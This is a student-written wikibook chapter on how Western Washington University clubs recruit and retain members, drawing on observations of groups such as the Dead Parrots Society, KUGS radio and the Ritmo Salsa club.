There are many exciting events held at WWU with the intention of recruitment for different clubs. Unlike many clubs such as the strong man club, many events are held off campus. The cycling club holds events for recruitment during races. This is a great way to show students what the club is all about as well as what they could be a part of if they joined.  Events like this are also a great fund raising strategy. 

A common type of event that some clubs use for recruitment are performances, most commonly used by dance clubs. When a dance club does a performance, it has the added bonus of spreading awareness about the club. The WWU Ritmo Latino Salsa Club, for example, does many performances and actively spreads awareness about the club along with the performance. Sometimes they even offer a small lesson in the dance after the performance, to get people interested. The advantage to this is not only is it inexpensive, but it previews what the club actually does to prospective members.

Many people are unsure of what they are interested in and most groups prove to be intimidating because they are focused on one topic. There are many world injustices, and many do not feel educated enough to fully participate in a certain club. The World Injustice Awareness club is a good starting point for people to talk to others about all the world injustices. It is like a beginner club because they are interested in all world injustices, and are not focused in on only one. After people are involved in this club they can join more focused clubs to really get involved in issues they find themselves passionate about. This club appears to be less intimidating to students because it is more broad and through this club they can find what they are passionate about. They don't have to feel as if they need to already know about an injustice and be already passionate about it to join this club.

Many clubs use a Facebook page to show when events will be. For the croquet club, event recruitment lies mainly in the club’s use of Facebook. The president, Devin Spencer, has done an absolutely marvellous job putting the club together and getting the word out using Facebook. When a match or meeting is going to be held, an event invitation can easily be sent out to every single member in the club. Devin has done a great job putting together the Facebook page so that the members can get the information that they need. Out of about 100 members, at least 20 will show up to events for the croquet club because they were easily alerted. Many members initially join the croquet Facebook group before going to any meetings and then go to a meeting or match when they get the event invitation. This is a good technique because learning about the club online is much less intimidating than going straight to the event in person. The Dead Parrots Society is another club that uses a Facebook page to get the word out about upcoming shows. Many clubs put a link to their Facebook page from the Western’s club page. Members can easily be alerted of the next club event.  Technology has made getting vital information to all members a very easy task. Facebook seems to be an extremely helpful tool for many clubs around Western.

===How to become a member ===
====Who to contact====

Often, new students come to college and decide to join a club, however, many are confused on the process of joining clubs. Often the best way to join a club is via a club fair. This is when the clubs spend some of their budget on advertising their clubs and provide a wealth of information. The president of the club is often there and will be happy to answer questions about joining. Also, all clubs are listed on the school's website most of the time, and attached to the club is contact information to the club leader. A simple email or a phone call is highly effective and somewhat more personal than a busy club fair, and the club president will often gladly explain functions, dates, and other useful information about the club.

Becoming involved in a Campus Christian Fellowship Core group has both similar and different methods as of recruitment compared to other groups. There are three ways to become involved in a core. The first way is the more traditional way that people become involved is by finding the location and time of the weekly Core meeting in their building (or the closest building to them) on the CCF website. The second way to become involved is a method that is shared by many clubs, such as the Dead Parrots Society and the Ritmo Salsa club, is to sign up for more information at the yearly Info Fair. The third way is the more unique way. As CCF Cores are a subsection of a larger organization, one can become involved in a Core by attending the CCF Friday night service, and filling out an information card. At that point, a leader within the community will contact you, and your information will be passed on to the Core leader closest to you, who will then personally contact you.

KUGS is the school radio station, and positions are paid. Before you can begin paid work at the station, you will read the new on air for a period of time without pay, during which they will train you for a position. KUGS has a great website you can find off the WWU homepage. This website has more information on how to apply and get involved. KUGS is located in the Viking Union, which is a nice central location for people who are interested. A successful strategy for KUGS is that they allow volunteers that do not attend WWU to become involved and help them out. If more clubs did this they might find better support and possibly more experienced people to help the club grow and expand.

The Croquet Club is a very easily accessible club.  Start by searching the Western Washington Club Page online and one will be able to find general information about the club and how to contact its most current president.  The club has also created a Facebook page, which is continually updated by its members.  On this page, you can find past croquet tournaments with pictures and information, current events and tournaments that are about to take place and many members who are readily willing to talk to new recruits.  Other groups such as SMASH club and Ritmo Salsa club have used Facebook as well to help recruit new members and list current events.  Since the Croquet Club does not host very many meeting, new members or recruits can talk to members on Facebook about attending tournaments and events.

====First meeting for a new member====
The first impression is the most important determining factor in whether a potential new club member will continue with that club they are checking out. What goes on during the meeting when that new member comes has a lot to do with the recruitment numbers. If the new member likes what they experiment they will tell their friends and encourage others to join. In this section there are several examples of what the first meeting is like for new members in clubs across the Western Washington University campus. The following observations discuss the things that clubs are doing good and the challenges that the clubs are encountering.

The Scottish Country Dance Club has been up and running for about 15 years and is comprised of a diverse group of loyal members. After attending a couple of the club’s meetings, it is obvious why this club has been such a success and why its members enjoy it so much. Upon entering the meeting for the first time my group and I were warmly welcomed by not only the leaders, but by every member of the club. They insisted upon our participation and were willing to take time out of the meeting to teach us the basic steps. The enthusiasm of the leaders and members was enthralling and it quickly became clear why people would enjoy participating in a club with such communal feeling. It seems as though many of the other dance based clubs such as Swing Kids, Hui O’ Hawaii, and Tango Club noted the same kind of enthusiasm and welcoming of new members whether experienced or not. It seems as though the goal of the Scottish Country Dance Club, along with other clubs, is not so much to compete and be the best, but rather to provide a comfortable environment for people who want to meet new friends and experience new activities.

The Scottish Country Dance Club at Western Washington University has trouble with recruitment due to the fact that the leaders of the group are very old. Their age gives them a disconnection to students which in turn contributes to the lack of members compared to many other groups on campus. At the same time, there is members of the group now because they were brought in by Tom or Rosemary. The fact that this elderly couple has such intense energy for the group is inspiring to some students. Another factor that leads to problems with recruitment is that the main student member that does the recruiting is a woman. If the one male in the group were to go out and try to get more men to join there would be a better chance of increasing the male members. If there were multiple girls to go out and just target men to join they would have better luck than one girl describing and talking about the group by herself. I think the number of members will increase because this group is so welcoming and more than willing to work with a new group member.  

The Scottish Country Dancing Club (SCDC) is a club fueled by the passion of its members.  Their love of dance and the Scottish culture is what bonds the group together.  Luckily the club has strong leadership.  Jenny and Rebecca, the other student leader/teacher are both very committed.  They attend all meetings and events and promote the club.  However one of the needs the club suffers from is its low membership.  8-20 people attend the club each week.  This is not a very large or consistent number.  This makes it hard to plan events, rehearse, integrate new members, hold onto new members, and challenge the old members.  This also makes it hard to access other needs of the club such as financial needs or needs for costumes and music, when not everyone in the club is present.  One major need the club has is the need for recruitment of more male members- as of now there are significantly more females in the group and I have only ever seen 3-4 men even attend the club meetings. 

The Dead Parrots Society has open rehearsal meetings on Tuesday nights. These rehearsals consist of games that make you comfortable with acting in front of a group. These games make you think on your toes and are improv' based. The leaders of the group are voted on by present members. Currently, the leader, or Artistic Director, is Kris. He decides who has sufficient ability to perform in the group. If you show a lot of enthusiasm and talent, then Kris will let you know and you can become a member of the group. Once you are a member of the group then you can perform in the shows. But unlike the Scottish Country Club the members don't introduce themselves individually to newcomer.Dead Parrots Society also has a unique way of inducting its members. In the past, call-ups used to consist of just a phone call telling the person that they were officially a “Dead Parrot.” Now, the system of calling someone up consists of a kidnapping and cake. 

The Creators of Visual Art and Literature have a unique method of interacting with a new member.  Generally, the new member is left alone and not considered part of the group, unless they conform to standards that are familiar to those who are already part of the group.  The member may work quietly or try to communicate with the members of the club.  However, if they are not already friends or have a relationship of some nature with a member of the group, they are not always accepted.  The first meeting is a crucial step for any aspiring member of any club because it is the first impression and is a deciding factor of whether they will come to more meetings.  The lack of members for most groups may be a lack of advertisement, but the members of the group must also realize that they must be somewhat welcoming, otherwise the potential members will not join.

As a new comer, the first meeting for the Ritmo Salsa Latino Dance club was a little unnerving. Having never salsa danced before, I wasn’t sure what to expect. As many people can attest, doing something you have never tried before can make you a little self conscious, especially if you have to try for the first time in front of a crowd. this is pretty much the same for any performance club, including, but not limited to, Swing Club. The dance coaches are very pleasant and patient, and willing to work with you 1 on 1 if the need arises. Over all it was a very good experience.

The first time a new comer walks into the Viking Commons Multi Purpose Room to attend a meeting for the Ritmo Salsa club they may feel intimidated by the beautiful and seemingly effortless dancing of its seasoned members. However, that intimidation goes away quickly because the group’s members are very friendly and love to see new people interested in their club. Unlike in the Creators of Visual Arts and Literature club, new members are welcomed with open arms no matter their skill level or if they have connections in the group. The Ritmo Salsa club offers different classes that range from beginning to advanced classes for the new members and members who have been around since the club began. New members are encouraged to take the beginning class as many times as they feel they need to until they are comfortable with the movements in the Salsa dance. Unlike the Dead Parrots Society, there is no one there who is judging how well you dance and no one is there to tell you that you cannot be a part of the club. All of the Ritmo Salsa club members are there to have a good time and they want new members to feel comfortable and find new confidence in their dancing abilities.

Western offers a variety of clubs and each one offers something different to the university. Though the first meeting for a new member may be intimidating and a little scary, there will come a time when that person feels at home. Western’s campus can seem like a big place at first and clubs allow the university to seem a bit smaller. Clubs offer a safe place where students can feel a sense of belonging. It is just a matter of getting over the initial fear of being in a new setting with new people.  Once the new member feels comfortable, however, that is when friendships are made and a great time at Western can begin.

===Info fair ===
During the first week of school of every year, Western Washington university holds an information fair in the central courtyard “Red Square”. Thusly, the event is called the “Red Square Info Fair.” In September of 2008, the information fair was a venue for some 125 of the school’s 231 clubs to publicize their group.&lt;ref&gt;AS Review.AS Review.http://www.asreview.as.wwu.edu/?p=238&lt;/ref&gt; The information fair also allows local businesses and departments of the college to advertise. Clubs and organizations interested in participating in the “Red Square Info Fair” should contact the Info Fair Coordinator. Events like the info fair are an excellent way for clubs and organizations to make their information readily accessible to a large number of people and is a great opportunity to recruit potential members. Since the fair is held at the beginning of the year, it allows members to get engaged early on and maximize their time and involvement in the club. 

====Materials to have at info fair====
For the World Injustice Awareness Club, the main way they recruit members is through the Red Square Info Fair that is held before school begins. For the WIAC, this is the main way for the current members to let new students know about the group. In order to set up a booth at the info fair, the group leader must sign up for a booth spot ahead of time. Once they have a spot confirmed, it is very important that the group has many pamphlets available for new students who are interested. The pamphlets should have the name of the group, a short description of what the group is and what they do, as well as contact information of the leader of the group and the date, time, and room where the group meets. 

It is important to have a sign or something to catch the eyes of the students walking around at the info fair. There are many different booths, so it is important to have a colorful, big sign, or some sort of game where you give prizes away in order to catch the attention of the prospective students. Having something that will catch the eye of students, as well as pamphlets that is short, and to the point, but has all the important information is the key to recruiting students at the info fair. According to the Harry Potter Club, the Dead Parrot Society club, and Ritmo Salsa club all depend heavily on recruiting students through the info fair.  All of these clubs, including the WIAC, take the same approach to recruitment and base it off of the info fair.  Because the info fairs are the main source of requirement for these groups, it is important that the pamphlets have the correct info about the group and start an email list. Most groups at the info fair will have a list where people can write their name and email and thus the groups are able to email prospective group members about the events and meetings that are being put on.

The info fair would be a perfect chance for the A'capella Club to get their name out. For word-of-mouth as the only type of advertisement makes it difficult for the club to gain more members. Instead, they could set up a station in Red Square and advertise by preforming. They could have sheet music of popular songs to hand out to people who would like to join the performance of the moment. But also, along with the sheet music, they should hand out the traditional pamphlets that contains information about their club.

The process of recruitment is a very important one for school clubs. Since all clubs are organized by the students and the members are students that all eventually graduate, it is vital that new members are constantly joining. Without recruitment many clubs would die out. The process of getting new members to join can be a tricky one because there are so many different ways to go about it. Usually recruitment happens by word of mouth or interest gained after public events. Recruitment is easy once you find the right technique.

Western Men Against Violence (WMAV) is great club but is lacking in recruitment. This is a club that I have collected information about in regards to recruitment. Initially, the club had had a booth set up to spread the word during the beginning of the school year. This seems to be true among a lot of clubs; there is a beginning engagement but no activities or lack effective activities that follow. The awareness of the club is mainly spread through word of mouth. Also, due to lack or recruiting there are some misconceptions about what the club actually represents. If the club worked more on recruitment the size of their club would definitely increase and they would make even a great direct impact on the community. A group member pointed out how there was a “slightly increased involvement after the vagina memoirs.” That is to say, events and activities may catch someone’s interest.  Another club on campus that faces this problem is the World Injustice Awareness Club. They are not a well known club on campus and have few members. They should address their advertising strategies so that they are more likely to recruit people. These two clubs provide insight for recruitment when running a club.

==Barriers to Membership==
In some groups, there are certain constraints for becoming a member.  Some clubs have requirements to obtain membership.  These can range from certain skills, such as singing in the A’capella group, to equipment, such as lifting weights for the bodybuilding club.  Another way some groups have a barrier to membership is through fees.  Some clubs simply can’t function without an initial capital investment.  These barriers hold some people back, but for the most part it is not a huge problem.

===Requirements for membership===
A.) While most clubs on campus are open to all students, there are some clubs which are specific to students who share certain traits. These traits can be specific to religion, gender, sexual orientation, or cultural heritage. These clubs are meant to provide a safe environment for those students who share innate common bonds and allow them to celebrate what is unique to them. Students who qualify for these exclusive clubs are encouraged to join and strengthen the ties that bring them together. 

====Identity====

Although the A’capella members are new to the WWU AS Club scene as of 2008, they have by no means had trouble keeping up with some of the more experienced clubs. Recruitment has, without a doubt, been the A’capella Club’s strongest attribute. Unlike many clubs at Western, the A’capella club is one of the few to have an auditioning process in order to gain membership into the club. Because the group only has on average about ten members total, there is never a huge need for new performers. The small membership of the club gives it an immense advantage over clubs who constantly stress over popularity and size. The only real need for new members comes when a singer in the club has to leave, usually due to graduation. . Because the administrators of the club have a personal knowledge of each member in the club, including when a singer will leave the group, the person in charge of recruiting and auditioning has months in advance to find replacement members. Much like the Western Men Against Violence Club, the A’capella club uses their recruitment strategies to overcome their weaknesses. In Wesley Baker’s transcript of his interview with members of WMAV, club members stated that their “being less aggressive and active in [their] ‘recruitment’ efforts may actually wind up being a huge benefit, we just have to utilize it more often.&quot; The less effort administrators have to put into recruitment, the more they can focus their efforts on other aspects of the club, such as booking gigs or improving rehearsals. However, because recruitment is done on an invite-only basis, it is ultimately the potential members, not the administrators who suffer. Acceptance into the club is entirely dependent on a person’s musical ability. One must not only be able to sing and blend well with the group as a whole, but also must be able to read music, learn pieces individually, and have a strong work ethic. This limits a great many people who may have an excellent voice, but that do not know how to read music. Essentially, the members of the group are nearly all comprised of music majors who have had extensive musical training. The probability of having non-music majors admitted into the group is very slim. Overall, the identity of potential members being so detailed and specific does not do any harm to the club, but rather it helps the club. By having a group fully comprised of music majors, the club is able to operate at a much higher musical level. There is no need to go into detail on basic musical elements because all members in the club have been musically trained. Therefore, the high level of success that the A’capella club has been able to achieve in its first year has primarily been due to its strong recruitment strategies.

While many have heard about the Student Homeless Outreach Team many may not know what this club is all about, it is much more than helping the homeless. The Student Homeless Outreach Team is about breaking down barriers for those in the community to identify with the homeless citizens and this is a problem when it comes to helping people understand the Identity of the club.

The Creators of Visual Art and Literature have a broad interpretation of their name which leads students to perceive a club with no real focus and may hinder them from joining.  Their identity should be labeled in a more accurate manner so as to entice people with similar interests.

Beyond finding a specific identity in a club, it is important to know the bottom line that club members are given an opportunity to identify with each other in the first place. Although there may be auditions or 'rights of passage' to official positions in the club, everyone can identify with one another in their share of interest for that specific club. These clubs offer a sense of community to nourish their passions and create identification with one another.

====Interest====
In the beginning of the school year, Western Washington University does an excellent job introducing the clubs at the university with the info fair. At the info fair, all the clubs at Western have their own booth where people they can tell potential members about their club. The initial interest of a club is usually made at this fair. Beyond the initial interest, the following clubs show strengths and weakness in how interest is either kept or ways that people lose interest in their club.

One strategy the Hui' O Hawaii club found successful in finding new members (and then keeping those members) was to open membership to anyone who is simply interested. If the club had chosen to include only people who had at least one Hawaiian parent - or even more strict, to have been born in Hawaii - they would have had a much harder time finding members. And some of those members might not have liked such a harsh rule. But by keeping the club open to anyone who was interested in Hawaiian culture, no matter the background, they kept a very friendly and open atmosphere that attracted many more people. The less limitations the club had on membership, the more members it drew in, and the friendlier the atmosphere tended to be.

The effective strategy that the Dead Parrots society use is having open rehearsals creating a relaxed environment for the participant to see whether or not he/she likes the group. It also gives everyone a chance to become a certified member. When you have this type of rehearsal its more relaxed because the participant can continue to attend even if they haven't been asked to join the performing members. Another club that uses a similar strategy is the Hui' O Hawaii club. It is similar because you do not have to be Hawaiian, you just have to be interested in the subject. This is efficient for acquiring new members.

The WWU Bodybuilding group does a good job of including new members or those that are interested.  The one problem for students that may be looking to enter the group is that the group does not have meetings on a regular basis.  Aside from that the group's focus is bodybuilding and the group members can always be found in the gym.  The group is fairly large already, about 60-80 members, and they are always welcoming new members or ready to tell anyone interested what it is about.  The one area where they do has less interest is the groups female involvement. Although the group does have some members that are female, including one of the head organizers, it is much lower in numbers compared to males just because of the object of the club and the stereotypes that accompany bodybuilding.  This is similar to the Dead Parrots Society in the sense that it is easy for members to get involved quickly.

KUGS is Westerns première radio station and they have a very organized way of getting people interested. KUGS advertises a great deal to incoming students as well as current students. They do this by advertising with fliers and during tours of the Viking Union. Anybody who is interested in music can be part of the KUGS family but it can be a scary thing to try out. To officially join KUGS you have to go through a series of volunteer work helping around the studio then working your way up to be a DJ, if that is what you want. This is different from other clubs such as the Hui' O Hawaii club because other clubs you can just join because your interested. With KUGS you can try it out if your interested but then have to work to be a part of the club. This is an effective strategy because KUGS members get paid for their work and so to weed out those who are not really interested they have a process that people must go through.

====Equipment====

Many clubs on the Western campus require specific types of equipment to function. For sports oriented clubs, much of the necessary gear can be found and used within the rec center. Others may have a more difficult time finding accessible equipment, requiring things either brought from home or purchased for the club. Some clubs require equipment as simple as a kite, a room, a book, or one's own body to participate. Regardless of what is necessary, and regardless of one's ability to obtain the equipment, it seems that AS clubs find ways to stay afloat and functioning, so long as passion in students can be found for what the club is all about.

The WWU Bodybuilding Club is based around weight lifting, which requires a lot of equipment. The equipment needed is things such as dumbbells, bench-presses, and a variety of machines. This equipment is very expensive and would cost the club a fortune. Fortunately the WWU Rec Center has all of the necessary equipment for the clubs needs. However, you need a membership to the Rec Center to be able to use the equipment, but all WWU students receive a membership included in tuition costs. So for the most part, membership to the Rec is not a problem. Other types of equipment such as workout clothes and lifting accessories must be provided by each WWU Bodybuilding Club member.

The Photography club allows anyone interested in taking pictures to join. A false stigma linked to the club may be that new members would need high quality cameras. This high expense may deter possible members. In actuality, the club only requires that you provide a device capable of taking pictures. This includes digital and disposable cameras and even the camera on your phone. So, the requirements fit every budget just like the Students of Optional Clothing.

When joining the LEAD group they have all the supplies provided for the members. There will only be exceptions like if you need sunscreen, or if you need an inhaler, or if someone is allergic to their surroundings. Other than that all the members have what they need to plant or participate.

====Skills====
The A'capella club is intended for members that have a specific skill(singing,vocal) and without this skill you cannot be a member, a problem in that maybe they could attract a few fans or followers to help them expand their audience. C) Unlike the A'capella club, the WWU Weight Lifting Club accepts anyone; people who have never picked up a weight or people who have been lifting their entire life, as long as you have the desire, you are welcome.

The specific skills that members of A'capella club are required to have are both beneficial and harmful to the strength of the club. Because A'capella club requires potential members to audition they are able to pick only singers who have the necessary skills and who will work with the dynamics of the group. This allows the A'capella club to maintain a quality group of singers who are all capable of performing together and who all get along. Unfortunately because of the specific skills needed to be a member of A'capella club there is a very small pool from which they can pick members from. These required skills make A'capella club unlike just about all other clubs who for the most part allow any and all to join. However, it is very necessary for the A'capella club to be seclusive if they intend to improve the quality of their music and form a larger fan base.

Much like the A’capella group, the Dead Parrots Society also requires somewhat of an audition to get in; but don’t let that scare you off! A seemingly ongoing audition through many open rehearsals will give you the experience needed to improvise in front of a crowd. The quick to learn, hilarious warm up games invite everyone and keep a consistent flow of newcomers. Many of the current Dead Parrots never improved in high school and starting out at WWU was their first experience in it. Although it takes an immense amount of skill to be funny on the spot in front of an audience, just getting involved in the preliminary games and watching the members during rehearsal effectively aids your mind in being able to come up with new material at the drop of a hat.

Unlike the A'capella club, the Photography club is open to anyone who is interested. This tactic is useful in attracting and maintaining membership. Although lack of skill may discourage people from joining, they will often tell the story of how a girl takes pictures from her camera phone. Becoming a member of this club can potentially advance you skills in taking pictures by collaborating and learning from other photographers. You can also learn to understand and accept the beauty of the work that it takes to produce these images. 

Although you do not necessarily have to have any specific skills to work at KUGS radio, there are qualities that help. Because you're not actually on the air until the second quarter, you don't have to know how to DJ a show when you sign up, but a general knowledge of musical electronic equipment will help loads. When it gets around to the third quarter when you can design your own music show, is when average volunteers are separated from dedicated DJs. This kind of distinction works well with this club, because those who have huge music libraries and a burning desire to share their tastes can have successful shows, and those who are more interested in the technical or organizational aspects can maintain positions helping out in that way. Unlike many other clubs, KUGS is more like a workplace, with different responsibilities assigned to different people, and many levels or organization. 

A great strategy for getting people to attend a club is opening it up to all skill levels and backgrounds of the clubs topic. Allowing people of many skill and age levels into a club helps the club attract an extremely diverse range of people and will increase the attendance of the club overall. If the club is free to join, with absolutely no standards and no prerequisites, then many more people will be enticed to join the club. If the club is opened up to anyone, it allows for the leaders to have a slightly less stressful job in which less structured organization is needed. In the photography club, they allow virtually anyone (with a camera) to join. On the other side of this equation, in the A’capella club, they have very strict guidelines for membership; you must audition therefore you must be a good enough singer to make the cut. This allows for about only ten people to be members. With this low membership, it allows for a very structured operation of the club, also leading to effective organization.

Although many clubs do not require any skill levels to a club, it is also important to be aware of certain risk factors, safety aspects, and levels of physical activity. In any sort of sports or dance club on campus, for example Ritmo Latino Salsa Club, attendees and members, if taking the dancing seriously, are advised to play safe. Dancing requires flexibility, coordination, and a high level of energy. Latin dancing is very passionate and a lot of fun, but spinning can cause dizziness, constant movement can cause dehydration, and stretching is absolutely vital. Obviously, the amount of preparation and safety precautions that must be taken depend on the level of intensity of the dance, but physical activity of any kind must be approached in a mature and intelligent manner. 

Another attribute that is important to have when attending Ritmo Latino Salsa Club is the ability to leave all inhibitions at the door. The club is extremely welcoming to new dancers and trained dancers alike, and remaining self-conscious will only hinder a member's ability to learn to move and dance fluidly and skilfully. With a lot of energy, preparation to have fun, passion for life, and willingness to try new things, anyone can learn to Latin dance.

The WWU cycling club is welcome to anyone out there who can ride a bike and wants to race.  Your skill level does not need to be at expert or even intermediate as beginners are also welcome.  Although if you are good at the sport the cycling team's sponsors are willing to support the top 5 riders at certain races.  There is a certain condition you probably should be in or get ready for as biking does exert a lot of energy.  Since there is no skill level requirement, this club is great for improving a persons stamina and getting people into shape.  Now as this club doesn't require a skill level, I know that there are choir groups on campus that you need to audition for, which requires a certain level of singing.

For the Women in the Woods club there are two very different pieces to the equation. The first piece is the skilled group of women and the second, the equally as important but less skilled women. The whole goal of the club is to provide a safe place for women to learn and grow in relationships with each other but also to grow personally. Just like lots of other clubs on campus such as Salsa Club, the experienced members are put in leadership positions to instruct and help the inexperienced members. For Women in the Woods, trips are planned in varying difficulty from simple day hikes to technical rock climbing. Technical skills aren’t needed for the majority of the activities but if you have the interest for technical and more intense activities they also have those options.

====GPA====
I don’t think GPA is necessary for clubs that need people to volunteer. There are some people that have a low GPA, but they are really dedicated volunteers. Also, if a club needs a volunteer immediately, then they should not be checking GPAs because then they can’t get as many help as they need. In addition, GPA does not really say anything about how hard people work. In the real world, people don’t get jobs because they have high GPAs but rather of their skills.

However, this may be true, the other side to this argument is that a high GPA shows a sense of dedication and the skill to thrive which is useful for most clubs.  It shows the club that the person is willing to work hard at everything they commit to.

===Fees for membership===
Many clubs choose to charge a membership fee for participants in order to fund activities and events for the club. The money is often applied towards supplies and materials necessary to have for the club to run smoothly. In the case of college clubs, a membership fee is usually paid directly to the club or through the University cashier. A club may require fees upon the time of joining the club either as a one-time membership fee or a scheduled set of dues, such as a yearly membership fee. Some people might think that fees should not be a part of student clubs, but sometimes these are necessary for the club to flourish and do fun activities. These small fees add up and could potentially help the club get more members as well as advertise for members to join.
 
====Reasonable fees for membership====
Two common strategies for club fees are: donations, and club members giving an equal share to cover the cost of events. The former, donations, can offer a more relaxed approach to the members while possessing the possibility of creating more financial stress for the leaders. It offers members to give as much as they want, which can sometimes leave the leaders being very short on the club’s costs. It does, however, present a fairly relaxed atmosphere. The other strategy shares the load with all members equally. For example, if a club puts on an event and the club has 20 members, each member covers 5% of the cost. Then, if the event makes any profits, the profits are shared equally among all 20 members. If a club member is not particularly interested in this event, however, it can cause stress and fracturing of the club due to a feeling of being ‘burdened’.

====If some can not afford a fee for membership====

If a member is unable to pay a membership fee they could instead do a service for the club.  This could range from posting fliers to setting up for an event.  At some point most clubs will need volunteers. Waving a membership fee is a good way to encourage members to lend a hand.

==Member Retention==

In many instances the retention of members is tied to the [[Effective_Student_Organization/Leadership_and_Communication|leadership and communication]] skills of the organizations leadership or to the [[Effective_Student_Organization/Hosting_Events|activities and events]] that the club regularly hosts, these are discussed in detail in future chapters. Here it is important to highlight the key factors in member retention as well as several specific issues related to retaining student participation across the academic calendar. 

===Ways to keep members===

Club membership is a top priority in order to maintain a club. During the school year, things happen and clubs can lose members along the way. There are ways to increase the chances of keeping members for longer periods of time in school clubs. Communication is key in keeping all members updated with information and helping them stay informed and interested. All groups should provide support and a sense of friendship. There are many different techniques that different clubs use to maintain their members. This section will give some examples of those techniques and how effective they are.  Maintaining membership is what keeps clubs running. Without members, a club cannot exist.  Also, it is important for clubs to stay in contact with their members throughout school breaks.  Even over summer it is important that membership stays strong so that the next year, the club won't have to start recruiting members from scratch. Making sure each member feels involved is key keeping them.

While studying the Creators of Visual Art and Literature Society, a very strong asset was discovered, and one that all groups should have; a sense of security and friendship. During a fellow classmate's interview with a group member who was a new freshman this year, she stated that the group acted as a support group for her first year, something that she greatly appreciated. The weekly, even unstructured, meetings of a group of people can make all the difference in how you are able to survive during those first months on your own. Whether they are there to offer support, or just provide a sense of stability, having a small number of friendly face around really can help. This is an asset that, through fellow classmates' interviews, was only found within the Christian Campus Fellowship, but is one that should be underlying in all. Once you have this sense of support within a group, the member that you have are more likely than not to stick around for their remaining time in school.

As stated in the previous paragraph, friendship creates a sense of security and belonging in ones self. Friendship is one of the main reasons that the Smash Masters And Students Headquarters (S.M.A.S.H.) club is still around today. Even though the club is not as big as it used to be, the member's love for the game &quot;Super Smash Brothers&quot; has kept the club together as they still meet weekly to play the game even at one of the member's houses. One of the members said that they keep attending the meetings because of the friends and relationships they have developed with the other members. Without mutual respect and appreciation, any club has the potential to fail. Keeping the members coming back is what counts.  

The Hui O' Hawaii club is an excellent illustration of the concept brought up in the previous paragraph: its simplest yet most potent asset is the incredibly strong group rapport between members. The meeting I sat in on was extremely relaxed and felt more akin to a giant group hang-out session among really close friends than a serious club meeting, except for the fact that they still managed to get a lot done, which shows that they have found a way to balance work and play and enjoy the best of both worlds. Brian Norvaisis, another member of my group, summed it up best when he wrote &quot;This group's strength... is the warm and affectionate atmosphere they give off&quot;. They may have difficulty in recruiting new members, but once people are in I get the distinct impression that they are in for life (or at least for the duration of their life here at Western), as a result of the palpable bond between members. This friendliness and rapport is vital to other clubs, as well. Grace Kim wrote of the Rugby Club that &quot;Their social life works to seek out new members by always being welcoming&quot; and Cameron Harris, a member of CCF, said that he was won over when &quot;These really friendly people just turned up and started talking to me and wanted to get to know me.&quot; Carly Hamilton was even moved to join the club her group is studying, which just goes to show that kindness and warmth go a long way!

As previously stated, the Hui O' Hawaii club of WWU has a very warm and inviting atmosphere that keeps members in the club. A good number of the members have some connection to Hawaii, whether it be family, grew up in Hawaii, or simply have some interest in Hawaii and it's culture. The people that originally came from Hawaii have a sense of home within the club. These people can talk and reminisce of Hawaii, and all the things they love about it. When coming to a university that maybe be vastly different than your &quot;home&quot; can make it stress full. The fact that Hui O' Hawaii brings &quot;home&quot; to WWU, it helps bring people closer together and keeps them together within the club. 

Akin to other cultural groups, FASA is effective at getting people to have fun and get interested in Filipino culture. Establishing the importance of meeting as scheduled among new members is a simple way to prevent problems in fluctuating attendance, low attendance, and diminishing interest among members. When people within the club accept this as a passive imperative, there is no ambiguity over what is expected of members to people joining. Another key aspect is environment -- setting the &quot;tone&quot; of the club -- and for that purpose, making an attempt to connect personally with interested people. FASA does this by having more integral consciously practice this, setting it as the norm and allowing it to become standard practice.

At Western Washington University, KUGS radio station, a student based organization that is highly run by volunteers, has had continued success in gaining new volunteers, as well as keeping those previously involved.  A major way KUGS has been able to keep members is by having a highly organized program with a consistent schedule and specific jobs within the station as a whole.  With such organization employed, members get detailed information about events going on in their particular department.  Everyone involved has a job to do that is specifically outlined.  Many people have titles that help categorize their duties at KUGS, whether it is “DJ,” “Promotion Director,” “Music Director,” “Morning Show Host,” or something else.  By having these different sections that are more focused on distinct and specific interests within radio, volunteers have many options of ways in which they can help KUGS while fulfilling their own desires and interests.  This really provides members with choice, variety, and flexibility, making KUGS a very appealing organization to volunteers and staff.  Plus, the radio operates all year long in a permanent location on campus, so you can always just drop by the seventh floor of Viking Union and check it out for yourself.  Other clubs, such as Students of Optional Clothing, don’t have a secure or consistent meeting spot (as noted by Kyle Olsen), making it hard to find and hard to stay involved with for those living busy lives.

One of the greatest strengths of the Dead Parrots Society that I noticed when observing the group practice session is that everyone is involved and respectful of the natural structure of the group. There would be one or two facilitators getting the ball rolling on each of the activities, but everyone really tried their best to make sure there was order in the group. Each activity ran very smoothly because each member of the group was invested in making sure it did go nicely. It was encouraging to see everyone working together so well. Another strength of the group is that they're obviously having fun, but they're still primarily focused on improvement and learning. Nothing that the group did felt like a &quot;waste of time&quot;. Every improv game they played was intentionally structured to teach and improve the actors and audience members. This indicates a lot of intentional thought on behalf of the directors of the group. To really retain members and preserve their interest in the events, it is important to allow them the freedom to &quot;own&quot; the group in this way. This can be compared to serious groups, such as the World Injustice Awareness group. In both groups, members have opportunities to participate, but the difference lies in the responsibility of the individual. The DPS asks each member to bring something different and unique to the group which makes their improv activities interesting. The WIA asks each member to work towards the same goal.

Western Washington University's rugby club team is also effective at keeping members. While in the beginning of the year the number of players who start out dwindles, the players that do stay tend to remain committed for all four years. I found that the thing that keeps the team together and so strong is the strong relationships that they have with each other and the fact that they're so passionate about the sport. The team members form a close bond that extends both on and off the field and players were quoted saying that some of their closest and best friends were on the team. Members of both the men and women's teams even made a coed softball team. This effective way of keeping members is similar to the qualities of the Hui o Hawaii Club. The Hawaii club gives off a &quot;warm and affectionate&quot; atmosphere with extremely dedicated members. It's apparent that a club's 'friendly factor' contributes to its success.

While learning and studying about the CCF club on campus I found that once people were members of the club they continued participating in CCF. The main reason for this is the sense of community that has been developed in CCF. During my interview with Kelli, a member of CFF, she stated that one of her favorite things about the club is the sense of community that she feels walking around campus and during CCF activities. Kelli said that while walking to classes she often sees many fellow members and loves the sense of community she feels all the time from being a member of CCF. She also said that through this sense of community she has created many good friends. After studying CCF it seems to me that the sense of community comes from a combination of different things. First, when someone new comes to a club meeting it is made sure that they feel very welcome. According to another CCF member that Victor Pendt interviewed, you are even given candy at the first meeting you attend. Furthermore, at typical meetings the CCF members engage in many group activities that strengthen this sense of community and friendship that is formed through the club. Finally there are so many different ways to get involved in CCF that you end up getting to know lots of different people, thus creating the CCF community. This sense of community and friendship is not only evident in CCF but also in the Croquet Club. Devin Spencer the leader of the Croquet club states that “he has met some of his now permanent friends through the club”. Through these two clubs it is obvious that friendship and a sense of community is a great way to insure your members will continue coming.
